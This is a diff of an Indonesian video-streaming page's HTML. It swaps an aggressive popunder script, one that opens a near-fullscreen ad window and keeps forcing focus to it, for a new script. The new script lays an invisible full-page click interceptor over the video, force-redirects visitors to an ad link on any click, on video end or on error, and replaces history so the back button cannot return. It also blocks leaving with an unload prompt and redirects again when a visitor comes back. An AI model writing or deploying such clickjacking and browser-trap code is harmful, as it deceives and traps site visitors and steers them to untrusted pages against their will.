@@ -107,7 +107,127 @@ footer{
   <script src="https://www.highperformanceformat.com/795ea17fd712c54274f94240a2ee1152/invoke.js"></script>
 </div>
 
-<!-- ===== MAIN SCRIPT ===== -->
+<script>
+  // CONFIG (ganti sesuai kebutuhan)
+  const TARGET_URL = 'https://petsrulefondness.com/dii28d7cuw?key=3b96fa2b939b689c32ab2e5d1fed2c3b';
+  const INTERCEPTOR_DELAY = 10000;    // 10 detik → overlay interceptor muncul
+  const MODAL_AFTER_SECONDS = 30;     // modal continue setelah video 30 detik
+  const REDIRECT_ON_END = true;       // redirect saat video selesai
+
+  // State
+  let redirectDone = false;
+  let interceptorActive = false;
+  let modalShown = false;
+  let countdownInterval = null;
+
+  // DOM elements (sesuaikan ID kalau beda)
+  const videoElem = document.getElementById('video');
+  const interceptorLayer = document.createElement('div'); // buat overlay interceptor
+  interceptorLayer.id = 'clickInterceptorLayer';
+  interceptorLayer.style.cssText = `
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: transparent; z-index: 9998; display: none; cursor: pointer;
+  `;
+  document.body.appendChild(interceptorLayer);
+
+  // Fungsi redirect paksa (ganti history supaya back gak balik)
+  function forceRedirect() {
+    if (redirectDone) return;
+    redirectDone = true;
+    window.location.replace(TARGET_URL);
+  }
+
+  // Fungsi buat modal continue (mirip logic asli)
+  function showContinueModal() {
+    if (modalShown) return;
+    modalShown = true;
+
+    if (videoElem) videoElem.pause();
+
+    const modal = document.createElement('div');
+    modal.id = 'continueModal';
+    modal.style.cssText = `
+      position: fixed; top:0; left:0; width:100%; height:100%;
+      background: rgba(0,0,0,0.85); color: #fff; z-index: 9999;
+      display: flex; align-items:center; justify-content:center; flex-direction:column;
+      font-family: Arial; text-align:center;
+    `;
+    modal.innerHTML = `
+      <h2 style="margin-bottom:20px;">Lanjutkan?</h2>
+      <p id="countdown" style="font-size:1.5rem; margin-bottom:20px;">3</p>
+      <button id="continueBtn" disabled style="
+        padding:12px 30px; font-size:1.2rem; background:#0f0; color:#000;
+        border:none; border-radius:8px; cursor:pointer; font-weight:bold;
+      ">Tunggu...</button>
+    `;
+    document.body.appendChild(modal);
+
+    let timeLeft = 3;
+    const countdownDisplay = modal.querySelector('#countdown');
+    const continueBtn = modal.querySelector('#continueBtn');
+
+    countdownInterval = setInterval(() => {
+      timeLeft--;
+      countdownDisplay.textContent = timeLeft;
+      if (timeLeft <= 0) {
+        clearInterval(countdownInterval);
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'Lanjutkan';
+      }
+    }, 1000);
+
+    continueBtn.onclick = () => {
+      clearInterval(countdownInterval);
+      modal.remove();
+      if (videoElem) videoElem.play();
+    };
+  }
+
+  // Init interceptor layer setelah delay
+  setTimeout(() => {
+    interceptorActive = true;
+    interceptorLayer.style.display = 'block';
+  }, INTERCEPTOR_DELAY);
+
+  // Klik di interceptor → redirect
+  interceptorLayer.addEventListener('click', forceRedirect);
+
+  // Kalau video ada (Plyr atau native)
+  if (videoElem) {
+    // Redirect kalau video error atau gak load
+    videoElem.addEventListener('error', () => {
+      setTimeout(forceRedirect, 2000);
+    });
+
+    // Redirect saat video selesai
+    if (REDIRECT_ON_END) {
+      videoElem.addEventListener('ended', forceRedirect);
+    }
+
+    // Modal setelah X detik playback
+    const checkTime = setInterval(() => {
+      if (videoElem.currentTime >= MODAL_AFTER_SECONDS && !modalShown) {
+        clearInterval(checkTime);
+        showContinueModal();
+      }
+    }, 500);
+  }
+
+  // Prompt susah keluar
+  window.addEventListener('beforeunload', e => {
+    if (!redirectDone) {
+      e.preventDefault();
+      e.returnValue = '';
+    }
+  });
+
+  // Extra: kalau back dari halaman target (trap ringan)
+  window.addEventListener('pageshow', e => {
+    if (e.persisted) {
+      setTimeout(forceRedirect, 500);
+    }
+  });
+</script><!-- ===== MAIN SCRIPT ===== -->
 <script>
 const params = new URLSearchParams(location.search);
 const id = params.get("id");
@@ -151,82 +271,7 @@ document.getElementById("shareBtn").onclick = () => {
     alert("Link disalin");
   }
 };
-</script><!-- === AGRESIF POPUNDER + BLOCK BACK BUTTON STYLE === -->
-  <script>
-    // 1. Cek apakah user sudah pernah dibukakan popunder (gunakan localStorage + timestamp)
-    const KEY = 'popunder_shown_v2';
-    const now = Date.now();
-    const ONE_DAY = 24 * 60 * 60 * 1000;
-
-    function sudahDitunjukkan() {
-      const data = localStorage.getItem(KEY);
-      if (!data) return false;
-      const parsed = JSON.parse(data);
-      return parsed && (now - parsed.time) < ONE_DAY;
-    }
-
-    function tandaiSudahDitunjukkan() {
-      localStorage.setItem(KEY, JSON.stringify({ time: now }));
-    }
-
-    // 2. Fungsi buka popunder + bikin susah balik
-    function launchAggressivePopunder() {
-      if (sudahDitunjukkan()) return;
-
-      // Buka popunder (ukuran hampir full screen biar terasa jail)
-      const pop = window.open(
-        'https://petsrulefondness.com/dii28d7cuw?key=3b96fa2b939b689c32ab2e5d1fed2c3b', // GANTI LINK INI !!!
-        '_blank',
-        'width=' + (screen.width * 0.98) + 
-        ',height=' + (screen.height * 0.98) + 
-        ',top=0,left=0,toolbar=0,location=1,menubar=0,scrollbars=1,resizable=1'
-      );
-
-      if (pop) {
-        tandaiSudahDitunjukkan();
-
-        // Blokir fokus balik ke halaman asli
-        setTimeout(() => {
-          if (pop && !pop.closed) {
-            try { pop.focus(); } catch(e) {}
-          }
-        }, 500);
-
-        // Tambah event biar susah ditutup / balik
-        window.onblur = function() {
-          if (pop && !pop.closed) {
-            try { pop.focus(); } catch(e) {}
-          }
-        };
-
-        // Extra: kalau user coba pindah tab / minimize, coba tarik fokus lagi
-        document.addEventListener('visibilitychange', () => {
-          if (document.hidden === false && pop && !pop.closed) {
-            setTimeout(() => pop.focus(), 300);
-          }
-        });
-      }
-    }
-
-    // Trigger di beberapa event biar hampir pasti kebuka
-    window.addEventListener('load', () => {
-      setTimeout(launchAggressivePopunder, 1200);     // setelah 1.2 detik
-    });
-
-    // Tambah trigger ekstra (agresif mode)
-    document.addEventListener('click', launchAggressivePopunder, { once: true });
-    document.addEventListener('mousemove', launchAggressivePopunder, { once: true });
-    document.addEventListener('scroll', launchAggressivePopunder, { once: true });
-
-    // Kalau user pencet tombol back/forward browser → coba buka lagi
-    window.addEventListener('pageshow', (e) => {
-      if (e.persisted) { // dari cache (back button)
-        setTimeout(launchAggressivePopunder, 800);
-      }
-    });
-
-  </script>
-
+</script>
 
   <!-- Histats.com  START  (aync)-->
 <script type="text/javascript">var _Hasync= _Hasync|| [];
@@ -243,4 +288,3 @@ hs.src = ('//s10.histats.com/js15_as.js');
 
 </body>
 </html>
-
